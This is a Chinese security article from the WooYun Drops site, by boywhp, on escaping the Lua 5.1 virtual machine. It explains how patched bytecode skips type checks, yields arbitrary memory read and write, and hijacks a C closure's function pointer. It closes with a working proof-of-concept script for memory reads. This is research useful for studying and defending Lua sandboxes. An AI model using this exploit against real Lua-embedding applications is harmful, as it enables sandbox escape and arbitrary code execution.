@@ -1,0 +1,240 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">LUA脚本虚拟机逃逸技术分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">boywhp</a> <span class="bull">·</span> <time title="2016/02/04 11:16" ui-time="" datetime="2016/02/04 11:16" class="published ng-binding ng-isolate-scope">2016/02/04 11:16</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p><strong>Author:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="284a47515f405868191a1e064b4745">[email&#160;protected]</a></strong></p><p>参考<a href="https://gist.github.com/corsix/6575486">https://gist.github.com/corsix/6575486</a></p><h1>0x00 LUA数据泄露</h1><hr><p>LUA提供了string.dump将一个lua函数dump为LUA字节码，同时loadstring函数加载字节码为LUA函数，通过操作LUA原始字节码可以使得LUA解释器进入特殊状态，甚至导致BUG发生。</p><pre><code>#!cpp
+asnum = loadstring(string.dump(function(x)
+  for i = x, x, 0 do
+    return i
+  end
+end):gsub("\96%z%z\128", "\22\0\0\128"))
+</code></pre><p>LUA字节码固定长度32bits，4字节，定义如下：</p><p>主要由op操作码、R(A)、R(B)、R(C)、R(Bx)、R(sBx)组成。A、B、C对应于LUA寄存器索引。</p><p>asnum函数可以将任意LUA对象转换为数字。（注：LUA5.1 64bitLinux环境）gsub函数将字节码<code>\96%z%z\128</code>替换为<code>\22\0\0\128</code>，如下：</p><pre><code>#!bash
+0071  60000080           [4] forprep    1   1        ; to [6]
+0075  1E010001           [5] return     4   2      
+0079  5F40FF7F           [6] forloop    1   -2       ; to [5] if loop
+</code></pre><p>执行gsub函数后，forprep指令被替换为JMP to [6]，LUA解释器forprep指令对应代码如下：</p><pre><code>#!cpp
+case OP_FORPREP: {
+        const TValue *init = ra;
+        const TValue *plimit = ra+1;
+        const TValue *pstep = ra+2;
+        L-&gt;savedpc = pc;  /* next steps may throw errors */
+        if (!tonumber(init, ra))
+          luaG_runerror(L, LUA_QL("for") " initial value must be a number");
+        else if (!tonumber(plimit, ra+1))
+          luaG_runerror(L, LUA_QL("for") " limit must be a number");
+        else if (!tonumber(pstep, ra+2))
+          luaG_runerror(L, LUA_QL("for") " step must be a number");
+        setnvalue(ra, luai_numsub(nvalue(ra), nvalue(pstep)));
+        dojump(L, pc, GETARG_sBx(i));
+        continue;
+</code></pre><p>正常情况下lua在forprep指令会检查参数是否为数字类型，并执行初始化，但是由于字节码被替换为JMP，直接跳过了LUA类型检查，进入forloop指令。</p><pre><code>#!bash
+case OP_FORLOOP: {
+        lua_Number step = nvalue(ra+2);
+        lua_Number idx = luai_numadd(nvalue(ra), step); /* increment index */
+        lua_Number limit = nvalue(ra+1);
+        if (luai_numlt(0, step) ? luai_numle(idx, limit)
+                                : luai_numle(limit, idx)) {
+          dojump(L, pc, GETARG_sBx(i));  /* jump back */
+          setnvalue(ra, idx);  /* update internal index... */
+          setnvalue(ra+3, idx);  /* ...and external index */
+        }
+        continue;
+      }
+</code></pre><p>forloop指令直接将循环参数转换为lua&#95;Number(double)类型，（因为正常情况下forprep已经检查过类型了），然后执行加法（+ 0），执行dojump return x；返回lua&#95;Number。</p><p>LUA使用TValue表示通用数据对象，格式如下:</p><table><tr><th>Value(64bit)</th><th>tt(32bit)</th><th>padd(32bit)</th></tr><tr><td>n</td><td><code>LUA_TNUMBER</code></td><td></td></tr><tr><td><code>GCObject *gc; -&gt; TString*</code></td><td><code>LUA_TSTRING</code></td><td></td></tr><tr><td><code>GCObject *gc; -&gt; Closure*</code></td><td><code>LUA_TFUNCTION</code></td><td></td></tr></table><h1>0x01 LUA任意内存读/写</h1><hr><pre><code>#!cpp
+read_mem = loadstring(string.dump(function(mem_addr) 
+  local magic=nil
+  local function middle()
+    local f2ii, asnum = f2ii, asnum
+    local lud, upval
+    local function inner()
+      magic = "01234567"
+      local lo,hi = f2ii(mem_addr)
+      upval = "commonhead16bits"..ub4(lo)..ub4(hi)
+      lo,hi = f2ii(asnum(upval));lo = lo+24
+      magic = magic..ub4(lo)..ub4(hi)..ub4(lo)..ub4(hi)
+    end
+    inner()
+    return asnum(magic)
+  end
+  magic = middle()
+  return magic
+end):gsub("(\164%z%z%z)....", "%1\0\0\128\1", 1))  --&gt; move 0,3
+</code></pre><p>先看最外部函数，对应的LUA字节码如下：</p><pre><code>#!bash
+0785  A4000000           [1] closure    2   0        ; 2 upvalues
+0789  00008000           [2] move       0   1      
+078D  00000000           [3] move       0   0      
+0791  C0000001           [4] move       3   2      
+0795  DC808000           [5] call       3   1   2  
+0799  40008001           [6] move       1   3      
+079D  5E000001           [7] return     1   2      
+</code></pre><p>LUA使用CLOSURE A Bx指令创建函数的一个实例(或闭包)。Bx是要实例化的函数在函数原型表中的函数编号。</p><p>closure 2 0 ：创建0号函数对象，结果保存到2号寄存器，具体代码如下：</p><pre><code>#!cpp
+case OP_CLOSURE: {
+        Proto *p;
+        Closure *ncl;
+        int nup, j;
+        p = cl-&gt;p-&gt;p[GETARG_Bx(i)];
+        nup = p-&gt;nups;
+        ncl = luaF_newLclosure(L, nup, cl-&gt;env);
+        ncl-&gt;l.p = p;
+        for (j=0; j&lt;nup; j++, pc++) {
+          if (GET_OPCODE(*pc) == OP_GETUPVAL)
+            ncl-&gt;l.upvals[j] = cl-&gt;upvals[GETARG_B(*pc)];
+          else {
+            lua_assert(GET_OPCODE(*pc) == OP_MOVE);
+            ncl-&gt;l.upvals[j] = luaF_findupval(L, base + GETARG_B(*pc));
+          }
+        }
+        setclvalue(L, ra, ncl);
+        Protect(luaC_checkGC(L));
+        continue;
+      }
+</code></pre><p>LUA内部使用Proto 数据结构表示函数原型，记录函数的一些基本信息。LUA使用UpVal数据结构记录当前函数外部变量引用情况。如：</p><pre><code>#!cpp
+function parent()
+  local upval=nil
+  function child() upval="child" end
+  child()
+  print(upval) --output string child
+end
+</code></pre><p>父函数定义一个局部变量upval，子函数直接使用了该变量，此时父函数在创建闭包时会初始化upval列表，LUA编译器生成CLOSURE A Bx指令后，会自动插入MOVE 0, B伪指令，R(B)指示带入子函数的Upval寄存器编号。</p><pre><code>#!bash
+0785  A4000000           [1] closure    2   0        ; 2 upvalues
+0789  00008000           [2] move       0   1      
+078D  00000000           [3] move       0   0      
+0791  C0000001           [4] move       3   2     --R(3) = R(2)
+0795  DC808000           [5] call       3   1   2  --Call R(3)
+</code></pre><p>执行<code>gsub("(\164%z%z%z)....", "%1\0\0\128\1", 1))</code>【%1指示第一匹配项】，将<code>move 0 1</code>替换为<code>move 0 3</code>指令，而寄存器3对应的是一个CLOSURE对象。因此middle及inner函数里面的magic实际执行middle函数对象。</p><p>LUA使用CALL A B C字节指令处理函数调用，寄存器 R(A)持有要被调用的函数对象的引用。函数参数置于R(A)之后的寄存器中。参数个数(B-1),返回值个数(C-1)。如call 3 3 1 表示R(3)->CLOSURE 参数2个分别是R(4)、R(5)，无返回值。</p><pre><code>#!cpp
+case OP_CALL: {
+        int b = GETARG_B(i);
+        int nresults = GETARG_C(i) - 1;
+        if (b != 0) L-&gt;top = ra+b;  /* else previous instruction set top */
+        L-&gt;savedpc = pc;
+        switch (luaD_precall(L, ra, nresults)) {
+          case PCRLUA: {
+            nexeccalls++;
+            goto reentry;  /* restart luaV_execute over new Lua function */
+          }
+</code></pre><p>LUA使用CallInfo数据结构执行函数调用跟踪，在luaD&#95;precall函数使用inc&#95;ci函数创建新的函数调用信息。</p><pre><code>#!cpp
+#define inc_ci(L) \
+  ((L-&gt;ci == L-&gt;end_ci) ? growCI(L) : \
+   (condhardstacktests(luaD_reallocCI(L, L-&gt;size_ci)), ++L-&gt;ci))
+</code></pre><p>lua_State->ci的call info for current function，每调用一个函数增加一个ci，RETRUN减少ci，CallInfo数据结构如下：</p><pre><code>#!cpp
+typedef struct CallInfo {
+  StkId base;  /* base for this function */
+  StkId func;  /* function index in the stack */
+  StkId top;  /* top for this function */
+  const Instruction *savedpc;
+  int nresults;  /* expected number of results from this function */
+  int tailcalls;  /* number of tail calls lost under this entry */
+} CallInfo;
+</code></pre><p>其中CallInfo 的func在luaD_precall函数中初始化指向R(A)对象</p><p>我们跟踪下inner函数大致流程：magic Upval通过修改字节码方式指向了middle函数，inner函数在返回前将magic赋值为一个字符串，然后执行OP&#95;RETURN指令返回middle函数。OP&#95;RETURN最终调用luaD_poscall执行L->ci--，切换回上层函数调用CallInfo信息，然后goto reentry，如下：</p><pre><code>#!cpp
+    LClosure *cl; 
+reentry:  /* entry point */
+    lua_assert(isLua(L-&gt;ci));
+    pc = L-&gt;savedpc;
+cl = &amp;clvalue(L-&gt;ci-&gt;func)-&gt;l;
+base = L-&gt;base;
+k = cl-&gt;p-&gt;k;
+</code></pre><p>其中的&amp;clvalue(L->ci->func)直接将ci->func转换为Closure*指针，但inner函数已经将ci->func对象修改为一个字符串对象，此后k = cl->p->k行获取函数原型的常量表。</p><p>先看下字符串对象和Closure对象的内存布局。</p><p><img alt="p1" img-src="507f5001868e1af08bf0d6dd63e709d7c8fb30b3.jpg"></p><p>cl->p对应TString第9个字符串开始的内容，magic在inner函数被初始化为"01234567"，将前8字节填充，并拼接两个内存指针，【..为LUA字符串连接符】如下：</p><p><code>magic = magic..ub4(lo)..ub4(hi)..ub4(lo)..ub4(hi)</code></p><p>ub4函数将一个32位整数转换为字符串，lo、hi分别对应64bit内存地址的低、高32位。该内存地址指向</p><p><code>lo,hi = f2ii(asnum(upval));lo = lo+24</code></p><p>注意upval是字符串类型（头长度24），因此lo+24刚好指向字符串内容，因此cl->p实际指向"commonhead16bits"..ub4(lo)..ub4(hi)</p><p>cl->p->k，对应的数据结构定义如下：</p><pre><code>#!cpp
+typedef struct Proto {
+  CommonHeader;
+  TValue *k;  /* constants u
+</code></pre><p>其中CommonHeader内存对齐后占用16字节，因此k指向我们传递的内存地址。</p><p>同理cl->upvals[0]也指向我们构造的内存地址。</p><pre><code>#!cpp
+typedef struct UpVal {
+  CommonHeader;
+  TValue *v;  /* points to stack or to its own value */
+</code></pre><p>此后执行middle函数执行return asnum(magic)语句，对应字节码如下：</p><pre><code>#!bash
+MOVE        5  1
+GETUPVAL    6  0    ; magic
+TAILCALL    5  2  0
+RETURN      5  0
+</code></pre><p>R(5) = R(1) = asnum函数对象，执行GETUPVAL 6 0 ，并将R(6)作为函数参数1调用asnum函数，最后返回asnum读取结果。</p><pre><code>#!cpp
+case OP_GETUPVAL: {
+  int b = GETARG_B(i);
+  setobj2s(L, ra, cl-&gt;upvals[b]-&gt;v);
+  continue;
+</code></pre><p>GETUPVAL 6 0 其中b=0因此cl->upvals[b]->v正是我们构造的内存地址，setobj2s函数从对应的内存地址复制数据到R(6)，此后通过asnum读取内容，实现任意内存地址读操作。同理如果在middle函数中对magic进行赋值，即可实现对任意地址写内存（实际会写8字节数值以及4字节的tt类型）</p><h1>0x02 代码执行</h1><hr><p>LUA使用OP&#95;CALL进行函数调用，luaD&#95;precall中处理了C函数CALL，如下</p><pre><code>#!cpp
+/* if is a C function, call it */
+    CallInfo *ci;
+    int n;
+    ci = inc_ci(L);  /* now `enter' new function */
+    ci-&gt;func = restorestack(L, funcr);
+    L-&gt;base = ci-&gt;base = ci-&gt;func + 1;
+    ci-&gt;top = L-&gt;top + LUA_MINSTACK;
+    ci-&gt;nresults = nresults;
+    lua_unlock(L);
+    n = (*curr_func(L)-&gt;c.f)(L);  /* do the actual call */
+</code></pre><p>LUA使用lua&#95;pushcclosure函数创建C函数闭包对象，LUA基础库luaB&#95;cowrap会调用lua_pushcclosure，创建一个CClosure *对象，具体LUA脚本如下：</p><pre><code>#!cpp
+co = coroutine.wrap(function() end)
+</code></pre><p>CClosure数据结构内存布局如下：</p><p><img alt="p2" img-src="16b6ec161d10fdd6a48b7dd6833f5107b44be323.jpg"></p><p>其object偏移位置32为函数指针f，通过前面的内存写技术可以将f替换为指定的函数地址即可实现任意代码执行。</p><h1>0x03 附：POC代码</h1><hr><pre><code>#!cpp
+asnum = loadstring(string.dump(function(x)
+  for i = x, x, 0 do
+    return i
+  end
+end):gsub("\96%z%z\128", "\22\0\0\128"))
+
+ub4 = function(x) -- Convert little endian uint32_t to char[4]
+  local b0 = x % 256; x = (x - b0) / 256
+  local b1 = x % 256; x = (x - b1) / 256
+  local b2 = x % 256; x = (x - b2) / 256
+  local b3 = x % 256
+  return string.char(b0, b1, b2, b3)
+end
+
+f2ii = function(x) -- Convert double to uint32_t[2]
+  if x == 0 then return 0, 0 end
+  if x &lt; 0 then x = -x end
+
+  local e_lo, e_hi, e, m = -1075, 1023
+  while true do -- this loop is math.frexp
+    e = (e_lo + e_hi)
+    e = (e - (e % 2)) / 2
+    m = x / 2^e
+    if m &lt; 0.5 then e_hi = e elseif 1 &lt;= m then e_lo = e else break end
+  end
+
+  if e+1023 &lt;= 1 then
+    m = m * 2^(e+1074)
+    e = 0
+  else
+    m = (m - 0.5) * 2^53
+    e = e + 1022
+  end
+
+  local lo = m % 2^32
+  m = (m - lo) / 2^32
+  local hi = m + e * 2^20
+  return lo, hi
+end
+
+ii2f = function(lo, hi) -- Convert uint32_t[2] to double
+  local m = hi % 2^20
+  local e = (hi - m) / 2^20
+  m = m * 2^32 + lo
+
+  if e ~= 0 then
+    m = m + 2^52
+  else
+    e = 1
+  end
+  return m * 2^(e-1075)
+end
+
+read_mem = loadstring(string.dump(function(mem_addr) -- AAAABBBB 1094795585 1111638594
+  local magic=nil
+  local function middle()
+    local f2ii, asnum = f2ii, asnum
+    local lud, upval
+    local function inner()
+      magic = "01234567"
+      local lo,hi = f2ii(mem_addr)
+      upval = "commonhead16bits"..ub4(lo)..ub4(hi)
+      lo,hi = f2ii(asnum(upval));lo = lo+24
+      magic = magic..ub4(lo)..ub4(hi)..ub4(lo)..ub4(hi)
+    end
+    inner()
+    return asnum(magic)
+  end
+  magic = middle()
+  return magic
+end):gsub("(\164%z%z%z)....", "%1\0\0\128\1", 1))  --&gt; move 0,3
+
+x="AAAABBBB"
+l,h=f2ii(asnum(x))
+x=ii2f(l+24,h)
+print(f2ii(read_mem(x)))
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/5136" rel="bookmark" id="re1">基于ngx_lua模块的waf开发实践</a></li><li><a href="http://drops.wooyun.org/tips/1322" rel="bookmark" id="re2">最新webqq密码的加密方式分析过程</a></li><li><a href="http://drops.wooyun.org/tips/218" rel="bookmark" id="re3">PostgreSQL的那点事儿</a></li><li><a href="http://drops.wooyun.org/tips/3827" rel="bookmark" id="re4">PHP文件包含漏洞总结</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">NWMonster</span> <span class="reply-time">2016-03-16 15:24:33</span></div><p></p><p>赞！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">大哥你小心点</span> <span class="reply-time">2016-02-04 14:38:18</span></div><p></p><p>@云水寒大哥你小心点</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">碧韩啊碧韩</span> <span class="weibo"></span> <span class="reply-time">2016-02-04 12:41:29</span></div><p></p><p>为什么我打开链接都是这样 http://t.cn/Rbsv0uj</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">云水寒</span> <span class="reply-time">2016-02-04 12:32:29</span></div><p></p><p>与看你的技术文章相比，我还是想听你的声音:)</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">boywhp</span> <span class="weibo"></span> <span class="reply-time">2016-02-04 11:55:39</span></div><p></p><p>终于发表了可惜不能完美执行，64bit linux一次只能执行最多10字符长度的命令</p><p></p></div></div></div></div></div></main>
